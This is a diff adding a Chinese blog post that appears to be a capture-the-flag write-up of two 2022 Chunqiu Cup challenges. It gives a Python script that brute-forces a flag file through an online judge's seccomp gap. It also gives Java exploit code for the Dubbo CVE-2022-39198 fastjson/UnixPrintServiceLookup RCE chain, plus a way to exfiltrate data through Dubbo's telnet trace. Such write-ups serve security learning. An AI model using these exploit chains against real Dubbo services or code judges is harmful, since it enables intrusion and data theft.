@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="PwnIO">
+
+
+
+
+
+<title>2022年春秋杯网络安全联赛两道有意思的题目 | Pwnio.com</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-7E0T45VP3T"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-7E0T45VP3T');
+</script>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Pwnio&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Pwnio&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">2022年春秋杯网络安全联赛两道有意思的题目</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">PwnIO</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2023-01-02&nbsp;&nbsp;23:26:46</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Tech/">Tech</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>PS: 本次比赛题目质量很高，主办方蛮用心的。</p>
+<h1 id="online-judge"><a href="#online-judge" class="headerlink" title="online_judge"></a>online_judge</h1><p>题目提供了一个简易的类似于ACM/ICPC竞赛的OJ环境，有一经典的示例题目A+B，通过HTTP API的形式提交代码，经评测后，返回评测结果。<br>后端评测使用了青岛大学的开源OnlineJudge：<br>评测调度：<a target="_blank" rel="noopener" href="https://github.com/QingdaoU/JudgeServer">https://github.com/QingdaoU/JudgeServer</a><br>评测核心：<a target="_blank" rel="noopener" href="https://github.com/QingdaoU/Judger">https://github.com/QingdaoU/Judger</a><br>flag在JudgeServer的容器实例/flag/flag文件中。</p>
+<p>通过查看Judger工程，实际上评测核心基于seccomp框架来过滤syscall，在C++语言代码对应的seccomp相关代码中，可以发现实际上read和open函数并没有被过滤，也就是说实际上用户的C++代码，是可以打开并读取文件的。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/QingdaoU/Judger/blob/newnew/src/rules/c_cpp.c">https://github.com/QingdaoU/Judger/blob/newnew/src/rules/c_cpp.c</a></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../runner.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _c_cpp_seccomp_rules(<span class="keyword">struct</span> config *_config, <span class="type">bool</span> allow_write_file) &#123;</span><br><span class="line">    <span class="type">int</span> syscalls_whitelist[] = &#123;<span class="built_in">SCMP_SYS</span>(read), <span class="built_in">SCMP_SYS</span>(fstat), <span class="comment">/* line 12，此处read为白名单 */</span></span><br><span class="line">                                <span class="built_in">SCMP_SYS</span>(mmap), <span class="built_in">SCMP_SYS</span>(mprotect),</span><br><span class="line">                                ...</span><br><span class="line">                                </span><br><span class="line">    <span class="keyword">if</span> (!allow_write_file) &#123; <span class="comment">/* line38开始，实际上两种模式，open系统调用都允许使用，只是权限上有区别 */</span></span><br><span class="line">        <span class="comment">// do not allow &quot;w&quot; and &quot;rw&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(open), <span class="number">1</span>, <span class="built_in">SCMP_CMP</span>(<span class="number">1</span>, SCMP_CMP_MASKED_EQ, O_WRONLY | O_RDWR, <span class="number">0</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> LOAD_SECCOMP_FAILED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(openat), <span class="number">1</span>, <span class="built_in">SCMP_CMP</span>(<span class="number">2</span>, SCMP_CMP_MASKED_EQ, O_WRONLY | O_RDWR, <span class="number">0</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> LOAD_SECCOMP_FAILED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(open), <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> LOAD_SECCOMP_FAILED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(dup), <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> LOAD_SECCOMP_FAILED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(dup2), <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> LOAD_SECCOMP_FAILED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(dup3), <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> LOAD_SECCOMP_FAILED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此，通过提交评测代码，可以读flag的内容；通过返回A+B例题的正确与错误结果，可以得到两种不同的评测结果。结合起来，即可以通过不断提交不同的评测代码，逐位枚举flag的方式来得到flag串。<br>例如，下面的代码，如果flag第一位为e，则会评测正确，否则错误：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    FILE *f = <span class="built_in">fopen</span>(<span class="string">&quot;/flag/flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">fgets</span>(str, <span class="number">100</span>, f);</span><br><span class="line">    <span class="keyword">if</span> (str[<span class="number">0</span>] == <span class="string">&#x27;e&#x27;</span>) <span class="built_in">printf</span>(<span class="string">&quot;3\n&quot;</span>, str);</span><br><span class="line">    <span class="built_in">fclose</span>(f);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以通过枚举str[i]和其可能的值，来枚举出所有的flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">host,port = <span class="string">&#x27;47.104.129.38&#x27;</span>,<span class="number">10101</span></span><br><span class="line">base_url = <span class="string">f&#x27;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&#x27;</span></span><br><span class="line">token_url = <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/getToken&#x27;</span></span><br><span class="line">judge_url = <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/judge&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getToken</span>():</span><br><span class="line">    result = requests.post(token_url).json()</span><br><span class="line">    <span class="keyword">assert</span> <span class="keyword">not</span> result[<span class="string">&#x27;error&#x27;</span>], <span class="string">&quot;System error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge</span>(<span class="params">chall:<span class="built_in">str</span>, src:<span class="built_in">str</span>, language:<span class="built_in">str</span> = <span class="string">&#x27;C&#x27;</span></span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;src&#x27;</span>: src,</span><br><span class="line">        <span class="string">&#x27;language&#x27;</span>: language,</span><br><span class="line">        <span class="string">&#x27;action&#x27;</span>: chall,</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>: token,</span><br><span class="line">    &#125;</span><br><span class="line">    result = requests.post(judge_url, json = data).json()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">token = getToken()</span><br><span class="line">table = <span class="string">&#x27;abcdeflg&#x27;</span> + string.digits + <span class="string">r&#x27;&#123;&#125;&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">        c_src = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        #include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">        int main()&#123;</span></span><br><span class="line"><span class="string">            int a, b;</span></span><br><span class="line"><span class="string">            FILE *f = fopen(&quot;/flag/flag&quot;, &quot;r&quot;);</span></span><br><span class="line"><span class="string">            char str[100];</span></span><br><span class="line"><span class="string">            fgets(str, 100, f);</span></span><br><span class="line"><span class="string">            if (str[%d] == &#x27;%s&#x27;) printf(&quot;3\\n&quot;, str);</span></span><br><span class="line"><span class="string">            fclose(f);</span></span><br><span class="line"><span class="string">            return 0;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span> % (i, j)</span><br><span class="line">        r = judge(<span class="string">&#x27;test&#x27;</span>, c_src)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;SUCCESS&#x27;</span> == r[<span class="string">&#x27;data&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+
+<h1 id="dubboapp"><a href="#dubboapp" class="headerlink" title="dubboapp"></a>dubboapp</h1><p>偏门走道狗屎运拿了一血的WEB题。挺有意思的。<br>服务端提供了一个Dubbo服务的监听端口，版本为Dubbo3.0.9。<br>本题的容器是不出网的。</p>
+<h2 id="怎么RCE？"><a href="#怎么RCE？" class="headerlink" title="怎么RCE？"></a>怎么RCE？</h2><p>结合最新的CVE-2022-39198漏洞信息，sun.print.UnixPrintServiceLookup类可以提供RCE效果。同时，dubbo provider中的服务实现类代码自带了隐式toString()效果（将Object类型强制类型转换成String会隐式调用toString），项目又自带fastJSON依赖库：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">DemoService</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object name)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hi &quot;</span> + name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因此，可以使用sayHello -&gt; fastjson getter -&gt; UnixPrintServiceLookup利用链。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> sun.print.UnixPrintServiceLookup;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.apache.dubbo.common.utils.FieldUtils.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicConsumer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring/dubbo-demo-consumer.xml&quot;</span>);</span><br><span class="line">        context.start();</span><br><span class="line">        <span class="type">DemoService</span> <span class="variable">demoService</span> <span class="operator">=</span> (DemoService) context.getBean(<span class="string">&quot;demoService&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;id&quot;</span>;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafe.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">unixPrintServiceLookup</span> <span class="operator">=</span> unsafe.allocateInstance(UnixPrintServiceLookup.class);</span><br><span class="line">        setFieldValue(unixPrintServiceLookup, <span class="string">&quot;cmdIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        setFieldValue(unixPrintServiceLookup, <span class="string">&quot;osname&quot;</span>, <span class="string">&quot;xx&quot;</span>);</span><br><span class="line">        setFieldValue(unixPrintServiceLookup, <span class="string">&quot;lpcFirstCom&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd, cmd, cmd&#125;);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;xx&quot;</span>, unixPrintServiceLookup);</span><br><span class="line">        <span class="type">String</span> <span class="variable">hello</span> <span class="operator">=</span> demoService.sayHello(jsonObject);</span><br><span class="line">        System.out.println(hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注：Windows下的JDK里，是没有UnixPrintServiceLookup这个类的。怎么办？自己写个简单的只有成员变量的就行了。。（反正你只是用来序列化呀）</p>
+<h2 id="怎么出网？"><a href="#怎么出网？" class="headerlink" title="怎么出网？"></a>怎么出网？</h2><p>一个小知识，Dubbo Provider的服务端口除了可接收正常的通讯报文外，为了方便开发者，其实还提供了telnet接口供人工干预，具体见文档：<a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh/docs/references/telnet/">https://cn.dubbo.apache.org/zh/docs/references/telnet/</a></p>
+<p>PS：似乎新版本还增加了个QOS功能：<a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh/docs3-v2/java-sdk/reference-manual/qos/overview/">https://cn.dubbo.apache.org/zh/docs3-v2/java-sdk/reference-manual/qos/overview/</a></p>
+<p>脑洞一下，里面有没有可以夹带数据出来的功能？<br>还真有，trace命令可以用来跟踪dubbo rpc的调用情况，有请求调用时，会在telnet中打印出请求参数和响应数据。<br>那么，直接通过RCE，往服务器上丢一个我们写的dubbo consumer，功能为读取flag，并以此为函数参数，调用provider即可。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.ApplicationConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.ReferenceConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.config.RegistryConfig;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ReferenceConfig&lt;DemoService&gt; reference = <span class="keyword">new</span> <span class="title class_">ReferenceConfig</span>&lt;DemoService&gt;();</span><br><span class="line">        reference.setApplication(<span class="keyword">new</span> <span class="title class_">ApplicationConfig</span>(<span class="string">&quot;dubbo-demo-api-consumer&quot;</span>));</span><br><span class="line">        reference.setRegistry(<span class="keyword">new</span> <span class="title class_">RegistryConfig</span>(<span class="string">&quot;multicast://224.5.6.7:1234&quot;</span>));</span><br><span class="line">        reference.setInterface(DemoService.class);</span><br><span class="line">        reference.setUrl(<span class="string">&quot;dubbo://127.0.0.1:20880&quot;</span>);</span><br><span class="line">        <span class="type">DemoService</span> <span class="variable">service</span> <span class="operator">=</span> reference.get();</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">streamReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file), StandardCharsets.UTF_8);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(streamReader);</span><br><span class="line">        <span class="keyword">while</span> ((content = bufferedReader.readLine()) != <span class="literal">null</span>)</span><br><span class="line">            builder.append(content);</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> service.sayHello(builder.toString());</span><br><span class="line">        System.out.println(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>RCE第一轮将你自己写的dubbo consumer的jar投递过去后，RCE第二轮将jar跑起来就行。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dubbo/java/jdk1.8.0_202/bin/java -jar /dubbo/java/target/exp.jar</span><br></pre></td></tr></table></figure>
+<p>注意你自己写的jar里MANIFEST.MF中包的路径不要搞错了，要不会缺依赖包（也可以直接拷题目给的附件中的，也可以执行的命令行里指定classpath）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: Main</span><br><span class="line">Class-Path: . lib/spring-core-4.3.7.RELEASE.jar lib/commons-logging-1.</span><br><span class="line"> 2.jar lib/spring-beans-4.3.7.RELEASE.jar lib/spring-context-4.3.7.REL</span><br><span class="line"> EASE.jar lib/spring-aop-4.3.7.RELEASE.jar lib/spring-expression-4.3.7</span><br><span class="line"> .RELEASE.jar lib/dubbo-3.0.9.jar lib/spring-context-support-1.0.8.jar</span><br><span class="line">  lib/javassist-3.28.0-GA.jar lib/netty-all-4.1.56.Final.jar lib/gson-</span><br><span class="line"> 2.8.9.jar lib/snakeyaml-1.29.jar lib/fastjson-1.2.83.jar lib/datanucl</span><br><span class="line"> eus-core-5.2.7.jar lib/datanucleus-rdbms-2.2.4.jar lib/curator-framew</span><br><span class="line"> ork-4.0.1.jar lib/curator-client-4.0.1.jar lib/curator-recipes-2.8.0.</span><br><span class="line"> jar lib/zookeeper-3.4.6.jar lib/log4j-1.2.16.jar lib/jline-0.9.94.jar</span><br><span class="line">  lib/netty-3.7.0.Final.jar lib/guava-16.0.1.jar lib/curator-x-discove</span><br><span class="line"> ry-5.2.1.jar lib/jackson-databind-2.10.0.jar lib/jackson-annotations-</span><br><span class="line"> 2.10.0.jar lib/jackson-core-2.10.0.jar lib/slf4j-simple-1.7.25.jar li</span><br><span class="line"> b/slf4j-api-1.7.25.jar</span><br></pre></td></tr></table></figure>
+<p>最终trace的效果如下：<br><img src="/2023/75ef5042d1bd/dubbo_trace.png" alt="dubbo_trace"></p>
+
+        </div>
+
+        
